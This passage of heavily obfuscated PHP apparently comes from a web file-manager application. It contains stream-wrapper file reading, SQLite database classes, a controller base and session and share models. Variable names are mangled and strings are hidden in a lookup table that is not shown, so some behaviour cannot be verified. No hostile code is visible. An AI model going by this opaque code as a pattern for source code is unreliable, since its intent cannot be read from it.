return $“”—¾öÄ; } public function stream_tell() { return $this->pose; } public function stream_seek($‡ëáÚê, $ñÒÎè¥) { $€çÂ×÷ =& $_SERVER[Ôó‡è­ƒ]; if ($ñÒÎè¥ == SEEK_SET) { $this->pose = $‡ëáÚê; } else { if ($ñÒÎè¥ == SEEK_CUR) { $this->pose += $‡ëáÚê; } else { if ($ñÒÎè¥ == SEEK_END) { $this->pose = $this->info[$€çÂ×÷[80]] + intval($‡ëáÚê); } } } if ($‡ëáÚê < 0) { $this->pose = $this->info[$€çÂ×÷[80]] + $‡ëáÚê; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Ôó‡è­ƒ][80]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ËáÕß°ã, $ô˜½–Áª) { $ûÁõ‡·Ş =& $_SERVER[Ôó‡è­ƒ]; $äÒ–èù¿ = $this->info($ËáÕß°ã); return array($ûÁõ‡·Ş[1503] => 0, $ûÁõ‡·Ş[1504] => 0, $ûÁõ‡·Ş[16] => 32768 + 511, $ûÁõ‡·Ş[1505] => 0, $ûÁõ‡·Ş[1506] => 0, $ûÁõ‡·Ş[1507] => 0, $ûÁõ‡·Ş[1508] => 0, $ûÁõ‡·Ş[80] => $äÒ–èù¿[$ûÁõ‡·Ş[80]], $ûÁõ‡·Ş[1509] => $äÒ–èù¿[$ûÁõ‡·Ş[1376]], $ûÁõ‡·Ş[1465] => $äÒ–èù¿[$ûÁõ‡·Ş[86]], $ûÁõ‡·Ş[1464] => $äÒ–èù¿[$ûÁõ‡·Ş[197]], $ûÁõ‡·Ş[1510] => 0, $ûÁõ‡·Ş[1511] => 0); } static $fileInfo = array(); public function info($Ø»€‰Ë‹) { $Ş‚’ÌÎò = $_SERVER[Ôó‡è­ƒ][1512]; if (isset(self::$fileInfo[$Ø»€‰Ë‹])) { return self::$fileInfo[$Ø»€‰Ë‹]; } if (substr($Ø»€‰Ë‹, 0, strlen($Ş‚’ÌÎò)) != $Ş‚’ÌÎò) { return !1; } self::$fileInfo[$Ø»€‰Ë‹] = IO::info(substr($Ø»€‰Ë‹, strlen($Ş‚’ÌÎò))); return self::$fileInfo[$Ø»€‰Ë‹]; } public static function read($ïü’îÆï, $íËœÅ„“, $ÑØÅÛƒ¬) { if (!isset(self::$_fopenCache[$ïü’îÆï])) { $äã“ŸÚ“ = new StreamWrapperIO(); $äã“ŸÚ“->stream_open($ïü’îÆï); self::$_fopenCache[$ïü’îÆï] = $äã“ŸÚ“; } $äã“ŸÚ“ = self::$_fopenCache[$ïü’îÆï]; return $äã“ŸÚ“->fileSubstr($íËœÅ„“, $ÑØÅÛƒ¬); } public static function _read($ÑõÍµï, $ªÂæØ¯, $ã¾ü†Õ) { $çİ”‰Ñæ =& $_SERVER[Ôó‡è­ƒ]; $ËË½†Ê³ = fopen($ÑõÍµï, $çİ”‰Ñæ[1380]); if (!$ËË½†Ê³) { return $çİ”‰Ñæ[12]; } $ÚáÙ¨Ñø = 8192; fseek($ËË½†Ê³, $ªÂæØ¯, SEEK_SET); $„Ú€¬øì = $çİ”‰Ñæ[12]; $’¯‚¯± = 0; while ($’¯‚¯± < $ã¾ü†Õ) { $Á¨É—±ª = min($ÚáÙ¨Ñø, $ã¾ü†Õ - $’¯‚¯±); $„Ú€¬øì .= fread($ËË½†Ê³, $Á¨É—±ª); $’¯‚¯± += $Á¨É—±ª; } fclose($ËË½†Ê³); return $„Ú€¬øì; } public function fileSubstr($Ú…ä§öÏ, $ÇÅøÅ‚¶) { $‚Øª»×™ =& $_SERVER[Ôó‡è­ƒ]; $áá¤à¦³ = $this->info[$‚Øª»×™[80]]; $å…«à‡Ü = $Ú…ä§öÏ; $ã¹›úËõ = $ÇÅøÅ‚¶; if ($Ú…ä§öÏ < 0) { $Ú…ä§öÏ = $áá¤à¦³ + $Ú…ä§öÏ; } if ($ÇÅøÅ‚¶ === !1) { $ÇÅøÅ‚¶ = $áá¤à¦³ - $Ú…ä§öÏ; } if ($Ú…ä§öÏ + $ÇÅøÅ‚¶ > $áá¤à¦³) { $ÇÅøÅ‚¶ = $áá¤à¦³ - $Ú…ä§öÏ; } if ($ÇÅøÅ‚¶ <= 0) { return $‚Øª»×™[12]; } if ($Ú…ä§öÏ < 0 || $Ú…ä§öÏ >= $áá¤à¦³ || $ÇÅøÅ‚¶ <= 0 || $ÇÅøÅ‚¶ > 1024 * 1024 * 10) { throw new Exception("\151\x6f\106\151\x6c\x65\x52\145\141\144\x20\x65\x72\x72\x6f\162\x21\40\x73\164\141\162\164\x3d{$Ú…ä§öÏ}\x3b\x6c\145\x6e\147\x74\150\75{$ÇÅøÅ‚¶}\x3b\x20\163\151\x7a\x65\75{$áá¤à¦³}\x3b"); } $ÇÏ›Ãµ = 64 * 1024; $õô“™¥ß =& self::$_chunkBuffer[$this->path]; if (!$õô“™¥ß) { $õô“™¥ß = array(); } $á×Š¡è² = 0; $£¦äÖ— = 0; $ö÷Ø‘¢ = $‚Øª»×™[12]; foreach ($õô“™¥ß as $á×Š¡è² => $ö÷Ø‘¢) { $á×Š¡è² = intval($á×Š¡è²); $£¦äÖ— = $á×Š¡è² + strlen($ö÷Ø‘¢); if ($Ú…ä§öÏ >= $£¦äÖ—) { continue; } if ($Ú…ä§öÏ >= $á×Š¡è² && $Ú…ä§öÏ + $ÇÅøÅ‚¶ <= $£¦äÖ—) { return substr($ö÷Ø‘¢, $Ú…ä§öÏ - $á×Š¡è², $ÇÅøÅ‚¶); } break; } if (count($õô“™¥ß) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($‚Øª»×™[1513], $‚Øª»×™[1514] . count($õô“™¥ß) . "\73\x73\x74\141\162\164\75{$Ú…ä§öÏ}\54\x6c\145\156\147\x74\x68\75{$ÇÅøÅ‚¶}\x3b\160\x6f\x73\145\x3a{$á×Š¡è²}\176{$£¦äÖ—}"); throw new Exception($‚Øª»×™[1515]); } $Õ¶ƒ¨Ñ‡ = intval($Ú…ä§öÏ / $ÇÏ›Ãµ) * $ÇÏ›Ãµ; $üï¶µ× = ceil(($Ú…ä§öÏ + $ÇÅøÅ‚¶) / $ÇÏ›Ãµ) * $ÇÏ›Ãµ - $Õ¶ƒ¨Ñ‡; $ÖÛû“‚Ù = IO::fileSubstr($this->path, $Õ¶ƒ¨Ñ‡, $üï¶µ×); $õô“™¥ß[$Õ¶ƒ¨Ñ‡ . $‚Øª»×™[12]] = $ÖÛû“‚Ù; ksort($õô“™¥ß); $®í¢ÊÛı = substr($ÖÛû“‚Ù, $Ú…ä§öÏ - $Õ¶ƒ¨Ñ‡, $ÇÅøÅ‚¶); return $®í¢ÊÛı; } private function log($­ØÂ¯ä, $¼Î¾Ì‹) { $ã˜×éÇÇ =& $_SERVER[Ôó‡è­ƒ]; $¸®ÎÊšÓ = timeFloat() - $this->timeStart; write_log(sprintf($ã˜×éÇÇ[1516], $­ØÂ¯ä, $this->info[$ã˜×éÇÇ[32]], $¸®ÎÊšÓ, $¼Î¾Ì‹), $ã˜×éÇÇ[1181]); } } class Message { function __construct() { } public function send($‘è •Ì¤ = '', $û¾½â¶» = array(), $µìú©ç³ = "\164\145\x78\x74") { $¾Ğúœ =& $_SERVER[Ôó‡è­ƒ]; $Ë­ÕµÃ = array($¾Ğúœ[33] => $¾Ğúœ[1517], $¾Ğúœ[753] => $‘è •Ì¤); if (in_array($µìú©ç³, array($¾Ğúœ[1517], $¾Ğúœ[1518]))) { $Ë­ÕµÃ[$¾Ğúœ[33]] = $µìú©ç³; } $û¾½â¶» = array($¾Ğúœ[511] => isset($û¾½â¶»[$¾Ğúœ[511]]) ? $û¾½â¶»[$¾Ğúœ[511]] : $¾Ğúœ[12], $¾Ğúœ[593] => isset($û¾½â¶»[$¾Ğúœ[593]]) ? $û¾½â¶»[$¾Ğúœ[593]] : $¾Ğúœ[12]); if (empty($‘è •Ì¤) || empty($û¾½â¶»[$¾Ğúœ[511]]) && empty($û¾½â¶»[$¾Ğúœ[593]])) { return !1; } $º¦ÁßĞÙ = array($¾Ğúœ[1458] => $Ë­ÕµÃ, $¾Ğúœ[1519] => $û¾½â¶»); Hook::trigger($¾Ğúœ[1520], $º¦ÁßĞÙ); } } goto Dä³‚Âª‘‚; E‹Àèšåãœ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $¹ûÙâş¢ =& $_SERVER[Ôó‡è­ƒ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$¹ûÙâş¢[6]] =& $config; $this->values[$¹ûÙâş¢[7]] =& $in; $this->tpl = TEMPLATE . MOD . $¹ûÙâş¢[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($Äº˜£­‡) { if (1 === func_num_args()) { $this->{$Äº˜£­‡} = new $Äº˜£­‡(); } else { $÷éÌæîä = new ReflectionClass($Äº˜£­‡); $¤Ò‘ğ¦ = func_get_args(); array_shift($¤Ò‘ğ¦); $this->{$Äº˜£­‡} = $÷éÌæîä->newInstanceArgs($¤Ò‘ğ¦); } return $this->{$Äº˜£­‡}; } public function routeBind($áØŸÉùÙ, $¾”Ï˜õå, $¿ï®á‡ó = 3) { $Œ”ì»ùÛ =& $_SERVER[Ôó‡è­ƒ]; $¬±Ÿç¨ø = $this->in[$Œ”ì»ùÛ[9]]; $áØŸÉùÙ = str_replace($Œ”ì»ùÛ[10], $Œ”ì»ùÛ[11], trim(trim($áØŸÉùÙ, $Œ”ì»ùÛ[8]), $Œ”ì»ùÛ[12])); if (!$áØŸÉùÙ || count($¬±Ÿç¨ø) <= $¿ï®á‡ó) { return !1; } $·óÊ¦û = !0; $€ø–İá© = explode($Œ”ì»ùÛ[8], $áØŸÉùÙ); for ($ƒà«€Ó¡ = 0; $ƒà«€Ó¡ < count($€ø–İá©); $ƒà«€Ó¡++) { if ($€ø–İá©[$ƒà«€Ó¡] != $¬±Ÿç¨ø[$¿ï®á‡ó + $ƒà«€Ó¡]) { $·óÊ¦û = !1; break; } } if (!$·óÊ¦û) { return; } call_user_func_array(array($this, $¾”Ï˜õå), array()); } public function routeArgs($«ìæƒĞğ = 3) { $Å—Š“Ä¢ = $this->in[$_SERVER[Ôó‡è­ƒ][9]]; if (count($Å—Š“Ä¢) <= $«ìæƒĞğ) { return array(); } $åÅäÃ = array(); for ($î­â™¬ = $«ìæƒĞğ; $î­â™¬ < count($Å—Š“Ä¢); $î­â™¬ += 2) { $åÅäÃ[$Å—Š“Ä¢[$î­â™¬]] = $Å—Š“Ä¢[$î­â™¬ + 1]; $this->in[$Å—Š“Ä¢[$î­â™¬]] = $Å—Š“Ä¢[$î­â™¬ + 1]; } return $åÅäÃ; } protected function assign($€’ñîçÊ, $€¥¸¬´) { $this->values[$€’ñîçÊ] = $€¥¸¬´; } protected function display($ÂİîŸ‰´) { ob_end_clean(); extract($this->values); require $this->tpl . $ÂİîŸ‰´; } } class DbSqliteBase extends Db { public function __construct($í†êü ÷ = '') { $›ûõøß° =& $_SERVER[Ôó‡è­ƒ]; if (!extension_loaded($›ûõøß°[13])) { think_exception(think_lang($›ûõøß°[14]) . $›ûõøß°[15]); } if (!empty($í†êü ÷)) { if (!isset($í†êü ÷[$›ûõøß°[16]])) { $í†êü ÷[$›ûõøß°[16]] = 438; } $this->config = $í†êü ÷; if (empty($this->config[$›ûõøß°[17]])) { $this->config[$›ûõøß°[17]] = array(); } } } public function connect($ì Ô‰Ÿ© = '', $ÍÚ§Öß = 0) { $“ª¯äâ =& $_SERVER[Ôó‡è­ƒ]; if (!isset($this->linkID[$ÍÚ§Öß])) { if (empty($ì Ô‰Ÿ©)) { $ì Ô‰Ÿ© = $this->config; } $ô£İé…¯ = !empty($ì Ô‰Ÿ©[$“ª¯äâ[17]][$“ª¯äâ[18]]) ? $ì Ô‰Ÿ©[$“ª¯äâ[17]][$“ª¯äâ[18]] : $this->pconnect; $¯‘²æÑ§ = $ô£İé…¯ ? $“ª¯äâ[19] : $“ª¯äâ[20]; $this->linkID[$ÍÚ§Öß] = $¯‘²æÑ§($ì Ô‰Ÿ©[$“ª¯äâ[21]], $ì Ô‰Ÿ©[$“ª¯äâ[16]]); if (!$this->linkID[$ÍÚ§Öß]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$ÍÚ§Öß], 30000); if (1 != think_config($“ª¯äâ[22])) { unset($this->config); } } return $this->linkID[$ÍÚ§Öß]; } public function free() { $this->queryID = null; } public function query($Ó³ö“®¬) { $Æ˜ñİ­å =& $_SERVER[Ôó‡è­ƒ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ó³ö“®¬; if ($this->queryID) { $this->free(); } think_action_status($Æ˜ñİ­å[23], 1); think_status($Æ˜ñİ­å[24]); $this->queryID = sqlite_query($this->_linkID, $Ó³ö“®¬); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ığ€ŒùÀ = $this->getAll(); return $ığ€ŒùÀ; } } public function execute($ßˆÑ¦ƒ·) { $®ˆâ´Ö£ =& $_SERVER[Ôó‡è­ƒ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ßˆÑ¦ƒ·; if ($this->queryID) { $this->free(); } think_action_status($®ˆâ´Ö£[25], 1); think_status($®ˆâ´Ö£[24]); $ÄÆîòı = sqlite_exec($this->_linkID, $ßˆÑ¦ƒ·); $this->debug(); if (!1 === $ÄÆîòı) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Ôó‡è­ƒ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ç§‹şÃ¯ = sqlite_query($this->_linkID, $_SERVER[Ôó‡è­ƒ][27]); if (!$Ç§‹şÃ¯) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÆÒä†Ä = sqlite_query($this->_linkID, $_SERVER[Ôó‡è­ƒ][28]); if (!$ÆÒä†Ä) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¯¿·×ª = array(); if ($this->numRows > 0) { for ($Æâ·Ìêœ = 0; $Æâ·Ìêœ < $this->numRows; $Æâ·Ìêœ++) { $¯¿·×ª[$Æâ·Ìêœ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $¯¿·×ª; } public function getFields($×ˆÚÉ¼õ) { $Îüî«ô =& $_SERVER[Ôó‡è­ƒ]; $Ç‚³²Ò¯ = $this->query($Îüî«ô[29] . $×ˆÚÉ¼õ . $Îüî«ô[30]); $Î• ïšÎ = array(); if ($Ç‚³²Ò¯) { foreach ($Ç‚³²Ò¯ as $’ùº€ => $”ÄÒ¶) { $Î• ïšÎ[$”ÄÒ¶[$Îüî«ô[31]]] = array($Îüî«ô[32] => $”ÄÒ¶[$Îüî«ô[31]], $Îüî«ô[33] => $”ÄÒ¶[$Îüî«ô[34]], $Îüî«ô[35] => (bool) ($”ÄÒ¶[$Îüî«ô[36]] === $Îüî«ô[12]), $Îüî«ô[37] => $”ÄÒ¶[$Îüî«ô[38]], $Îüî«ô[39] => strtolower($”ÄÒ¶[$Îüî«ô[40]]) == $Îüî«ô[41], $Îüî«ô[42] => strtolower($”ÄÒ¶[$Îüî«ô[43]]) == $Îüî«ô[44]); } } return $Î• ïšÎ; } public function getTables($ù²ƒğ« = '') { $çÀ¤‹Æœ =& $_SERVER[Ôó‡è­ƒ]; $ÅÚØê = $this->query($çÀ¤‹Æœ[45] . $çÀ¤‹Æœ[46] . $çÀ¤‹Æœ[47]); $Æğä½ã = array(); foreach ($ÅÚØê as $Âºğ«÷ => $ŞÛºĞÀ’) { $Æğä½ã[$Âºğ«÷] = current($ŞÛºĞÀ’); } return $Æğä½ã; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $Ñ•¿å–§ =& $_SERVER[Ôó‡è­ƒ]; $—ûİêìõ = sqlite_last_error($this->_linkID); $this->error = $—ûİêìõ . $Ñ•¿å–§[4] . sqlite_error_string($—ûİêìõ); if ($Ñ•¿å–§[12] != $this->queryStr) { $this->error .= LNG($Ñ•¿å–§[48]) . $this->queryStr; } think_trace($this->error, $Ñ•¿å–§[12], $Ñ•¿å–§[49]); return $this->error; } public function escapeString($ö‰€—¢º) { return sqlite_escape_string($ö‰€—¢º); } public function parseLimit($Û¯Ÿ¼è) { $…€‹’ßÍ =& $_SERVER[Ôó‡è­ƒ]; $¦ã—îãº = $…€‹’ßÍ[12]; if (!empty($Û¯Ÿ¼è)) { $Û¯Ÿ¼è = explode($…€‹’ßÍ[50], $Û¯Ÿ¼è); if (count($Û¯Ÿ¼è) > 1) { $¦ã—îãº .= $…€‹’ßÍ[51] . $Û¯Ÿ¼è[1] . $…€‹’ßÍ[52] . $Û¯Ÿ¼è[0] . $…€‹’ßÍ[53]; } else { $¦ã—îãº .= $…€‹’ßÍ[51] . $Û¯Ÿ¼è[0] . $…€‹’ßÍ[53]; } } return $¦ã—îãº; } } class DbSqlite3Base extends Db { public function __construct($ËºÀàˆ” = '') { $ÑÀ¨Ğ›— =& $_SERVER[Ôó‡è­ƒ]; if (!class_exists($ÑÀ¨Ğ›—[54])) { think_exception(think_lang($ÑÀ¨Ğ›—[14]) . $ÑÀ¨Ğ›—[55]); } if (!empty($ËºÀàˆ”)) { if (!isset($ËºÀàˆ”[$ÑÀ¨Ğ›—[16]])) { $ËºÀàˆ”[$ÑÀ¨Ğ›—[16]] = 438; } $this->config = $ËºÀàˆ”; if (empty($this->config[$ÑÀ¨Ğ›—[17]])) { $this->config[$ÑÀ¨Ğ›—[17]] = array(); } } } public function connect($‚ÔéÌø£ = '', $†Š™Ÿ¬ = 0) { $òØüÃ— =& $_SERVER[Ôó‡è­ƒ]; if (!isset($this->linkID[$†Š™Ÿ¬])) { if (empty($‚ÔéÌø£)) { $‚ÔéÌø£ = $this->config; } $this->linkID[$†Š™Ÿ¬] = new SQLite3($‚ÔéÌø£[$òØüÃ—[21]]); if (!$this->linkID[$†Š™Ÿ¬]) { think_exception($this->linkID[$†Š™Ÿ¬]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$†Š™Ÿ¬]->busyTimeout(30000); if (1 != think_config($òØüÃ—[22])) { unset($this->config); } } return $this->linkID[$†Š™Ÿ¬]; } public function free() { $this->queryID = null; } public function query($ÉÜ¤±ÖÚ) { $¨Ï“¾å‰ =& $_SERVER[Ôó‡è­ƒ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÉÜ¤±ÖÚ; if ($this->queryID) { $this->free(); } think_action_status($¨Ï“¾å‰[23], 1); think_status($¨Ï“¾å‰[24]); $this->queryID = $this->_linkID->query($ÉÜ¤±ÖÚ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $âÏ‰î€» = $this->getAll(); $this->numRows = count($âÏ‰î€»); return $âÏ‰î€»; } } public function execute($òË’îÑ­) { $’ì½œ¨ =& $_SERVER[Ôó‡è­ƒ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $òË’îÑ­; if ($this->queryID) { $this->free(); } think_action_status($’ì½œ¨[25], 1); think_status($’ì½œ¨[24]); $Äô·Ò¾È = $this->_linkID->exec($òË’îÑ­); $this->debug(); if (!1 === $Äô·Ò¾È) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Ôó‡è­ƒ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÕĞ»Äçƒ = $this->_linkID->query($_SERVER[Ôó‡è­ƒ][27]); if (!$ÕĞ»Äçƒ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ùìÚáïÑ = $this->_linkID->query($_SERVER[Ôó‡è­ƒ][28]); if (!$ùìÚáïÑ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Ö”ª‘ÕÄ = array(); while ($èğåõàŒ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Ö”ª‘ÕÄ[] = $èğåõàŒ; } $this->queryID->reset(); return $Ö”ª‘ÕÄ; } public function getFields($ğˆ£ ä³) { $ã˜ÂÜ² =& $_SERVER[Ôó‡è­ƒ]; $Ã¥âö„ = $this->query($ã˜ÂÜ²[29] . $ğˆ£ ä³ . $ã˜ÂÜ²[30]); $á¾¸Ø°§ = array(); if ($Ã¥âö„) { foreach ($Ã¥âö„ as $Ù»ßñÁ => $í—ú€Ç) { $á¾¸Ø°§[$í—ú€Ç[$ã˜ÂÜ²[32]]] = array($ã˜ÂÜ²[32] => $í—ú€Ç[$ã˜ÂÜ²[32]], $ã˜ÂÜ²[33] => $í—ú€Ç[$ã˜ÂÜ²[33]], $ã˜ÂÜ²[35] => (bool) ($í—ú€Ç[$ã˜ÂÜ²[35]] === $ã˜ÂÜ²[12]), $ã˜ÂÜ²[37] => $í—ú€Ç[$ã˜ÂÜ²[56]], $ã˜ÂÜ²[39] => (bool) $í—ú€Ç[$ã˜ÂÜ²[57]], $ã˜ÂÜ²[42] => (bool) $í—ú€Ç[$ã˜ÂÜ²[57]]); } } return $á¾¸Ø°§; } public function getTables($ßı•çÅã = '') { $ÏïšéúÏ =& $_SERVER[Ôó‡è­ƒ]; $òî¹¤œ¸ = $this->query($ÏïšéúÏ[45] . $ÏïšéúÏ[46] . $ÏïšéúÏ[47]); $Ü½¡Øæ = array(); foreach ($òî¹¤œ¸ as $‡èÇ¯‡¥ => $¶Âë“é) { $Ü½¡Øæ[$‡èÇ¯‡¥] = current($¶Âë“é); } return $Ü½¡Øæ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $˜¢Ä¦¦ =& $_SERVER[Ôó‡è­ƒ]; $this->error = $this->_linkID->lastErrorMsg(); if ($˜¢Ä¦¦[12] != $this->queryStr) { $this->error .= LNG($˜¢Ä¦¦[48]) . $this->queryStr; } think_trace($this->error, $˜¢Ä¦¦[12], $˜¢Ä¦¦[49]); return $this->error; } public function escapeString($ó«¼‰í) { $ùé…âÆÇ =& $_SERVER[Ôó‡è­ƒ]; if ($this->_linkID) { return $this->_linkID->escapeString($ó«¼‰í); } return str_ireplace($ùé…âÆÇ[58], $ùé…âÆÇ[59], $ó«¼‰í); } public function parseLimit($Ï¬‘ü¼ş) { $â†·ò =& $_SERVER[Ôó‡è­ƒ]; $ºàô…‰Ê = $â†·ò[12]; if (!empty($Ï¬‘ü¼ş)) { $Ï¬‘ü¼ş = explode($â†·ò[50], $Ï¬‘ü¼ş); if (count($Ï¬‘ü¼ş) > 1) { $ºàô…‰Ê .= $â†·ò[51] . $Ï¬‘ü¼ş[1] . $â†·ò[52] . $Ï¬‘ü¼ş[0] . $â†·ò[53]; } else { $ºàô…‰Ê .= $â†·ò[51] . $Ï¬‘ü¼ş[0] . $â†·ò[53]; } } return $ºàô…‰Ê; } } goto F‹²òê¥¥„; f»²®¥©Ú‘: class SessionModel extends ModelBase { protected $tableName = "\163\171\x73\x74\x65\x6d\x5f\x73\145\163\163\x69\x6f\156"; public function get($–ï˜Ø‡ê) { $ß£‡™´ =& $_SERVER[Ôó‡è­ƒ]; $ıŞÚù‘ğ = $this->where(array($ß£‡™´[1955] => $–ï˜Ø‡ê))->find(); if (!is_array($ıŞÚù‘ğ)) { return !1; } return $ıŞÚù‘ğ[$ß£‡™´[753]]; } public function set($ë°’é…Û, $Ğ‹Ë×‚Å, $©œËÊÇ = 3600) { $Ø¿ËÂÕ =& $_SERVER[Ôó‡è­ƒ]; $ï©¬‚§ = array($Ø¿ËÂÕ[1955] => $ë°’é…Û, $Ø¿ËÂÕ[1861] => $Ğ‹Ë×‚Å, $Ø¿ËÂÕ[1956] => $©œËÊÇ + time()); if (Session::get($Ø¿ËÂÕ[1957])) { $ï©¬‚§[$Ø¿ËÂÕ[1655]] = Session::get($Ø¿ËÂÕ[1957]); } else { $ï©¬‚§[$Ø¿ËÂÕ[1655]] = 0; } if ($this->get($ë°’é…Û)) { return $this->where(array($Ø¿ËÂÕ[1955] => $ë°’é…Û))->save($ï©¬‚§); } else { return $this->add($ï©¬‚§, array(), !0); } } public function remove($İ¾Š‡Ø¯) { return $this->where(array($_SERVER[Ôó‡è­ƒ][1955] => $İ¾Š‡Ø¯))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Ôó‡è­ƒ][1958] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\162\x65"; protected $dataAuto = array(array("\x6d\x6f\x64\151\x66\171\x54\x69\155\x65", "\164\151\x6d\x65", "\x69\x6e\163\145\x72\x74\54\x75\x70\144\141\164\145", "\146\x75\156\x63\164\x69\157\x6e"), array("\x63\162\x65\141\x74\x65\124\151\x6d\145", "\x74\151\x6d\145", "\151\x6e\163\145\x72\164", "\146\165\x6e\x63\x74\x69\157\x6e"), array("\157\x70\164\x69\x6f\x6e\x73", '', "\151\x6e\x73\145\x72\164\54\x75\x70\144\141\164\x65\x2c\x73\145\154\145\x63\x74", "\152\x73\x6f\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($•ˆš®øğ) { $ü¸ÂÌŞÀ =& $_SERVER[Ôó‡è­ƒ]; $Öìåˆ¨é = isset($•ˆš®øğ[0]) ? $•ˆš®øğ[0] : !1; return array($ü¸ÂÌŞÀ[1959] => array(USER_ID, $ü¸ÂÌŞÀ[1960]), $ü¸ÂÌŞÀ[1902] => array($Öìåˆ¨é, $ü¸ÂÌŞÀ[1961])); } protected function listSimple() { $¬ï¯âõò = array($_SERVER[Ôó‡è­ƒ][1655] => USER_ID); $Š“§ Îƒ = $this->field($this->fieldList)->where($¬ï¯âõò)->select(); return $Š“§ Îƒ ? $Š“§ Îƒ : array(); } protected function getInfo($œ“³÷‹–, $ãÙşÈ¨Ş = false) { $„ÒªéÅ¤ =& $_SERVER[Ôó‡è­ƒ]; if ($ãÙşÈ¨Ş) { return $this->_getShareInfo(array($„ÒªéÅ¤[484] => $œ“³÷‹–)); } $„ñ¥œşî = $this->cacheFunctionGet($„ÒªéÅ¤[1904], $œ“³÷‹–); return $„ñ¥œşî; } public function getInfoByHash($£ÎÀˆÍú) { return $this->_getShareInfo(array($_SERVER[Ôó‡è­ƒ][486] => $£ÎÀˆÍú)); } public function getInfoByPath($»‹‚¿ÏÂ) { $·„ìÇù˜ =& $_SERVER[Ôó‡è­ƒ]; $øá‰°›¯ = array($·„ìÇù˜[1655] => USER_ID, $·„ìÇù˜[399] => $»‹‚¿ÏÂ); return $this->_getShareInfo($øá‰°›¯); } public function getInfoBySourcePath($…âà¶ñô) { $ˆÈ•É×ª =& $_SERVER[Ôó‡è­ƒ]; $ºÖÎ˜Ú = array($ˆÈ•É×ª[1655] => USER_ID, $ˆÈ•É×ª[1174] => $…âà¶ñô); return $this->_getShareInfo($ºÖÎ˜Ú); } private function _getShareInfo($ÃºéÏâ•) { $ê¥ï÷£ü =& $_SERVER[Ôó‡è­ƒ]; $•¾Öª€ª = $this->where($ÃºéÏâ•)->find(); if (!$•¾Öª€ª) { return !1; } $ÃºéÏâ• = array($ê¥ï÷£ü[484] => $•¾Öª€ª[$ê¥ï÷£ü[484]]); $ÁÖ¬ûØ = $ê¥ï÷£ü[1962]; $§¾ØêƒŠ = Model($ê¥ï÷£ü[595])->order($ê¥ï÷£ü[396])->field($ÁÖ¬ûØ)->where($ÃºéÏâ•)->select(); if ($•¾Öª€ª[$ê¥ï÷£ü[399]] == $ê¥ï÷£ü[194]) { $•¾Öª€ª[$ê¥ï÷£ü[87]] = IO::info($•¾Öª€ª[$ê¥ï÷£ü[1174]]); } else { $•¾Öª€ª[$ê¥ï÷£ü[87]] = Model($ê¥ï÷£ü[1325])->pathInfo($•¾Öª€ª[$ê¥ï÷£ü[399]]); } $•¾Öª€ª[$ê¥ï÷£ü[1963]] = $§¾ØêƒŠ; return $•¾Öª€ª; } protected function getInfoAuth($Ñ–ê±â¹) { $ñ½’ù©‡ =& $_SERVER[Ôó‡è­ƒ]; $ä¶’øòš = $this->getInfo($Ñ–ê±â¹); if ($ä¶’øòš[$ñ½’ù©‡[1655]] == USER_ID) { $ä¶’øòš[$ñ½’ù©‡[410]] = $ä¶’øòš[$ñ½’ù©‡[87]][$ñ½’ù©‡[410]]; } else { $ä¶’øòš[$ñ½’ù©‡[410]] = Model($ñ½’ù©‡[498])->authMake($ä¶’øòš[$ñ½’ù©‡[1963]]); } return $ä¶’øòš; } protected function listData($ßòıé®´ = null, $õ›è„ğ£ = 300) { $ªÌ×Ÿ¹ =& $_SERVER[Ôó‡è­ƒ]; $ÚÔß™Æ– = array(array($ªÌ×Ÿ¹[489] => array($ªÌ×Ÿ¹[1012], 0), $ªÌ×Ÿ¹[491] => array($ªÌ×Ÿ¹[1012], 0), $ªÌ×Ÿ¹[1964] => $ªÌ×Ÿ¹[1920])); if ($ßòıé®´ == $ªÌ×Ÿ¹[1965]) { $ÚÔß™Æ– = array($ªÌ×Ÿ¹[489] => 1); } else { if ($ßòıé®´ == $ªÌ×Ÿ¹[1159]) { $ÚÔß™Æ– = array($ªÌ×Ÿ¹[491] => 1); } } $ÚÔß™Æ–[$ªÌ×Ÿ¹[1655]] = USER_ID; 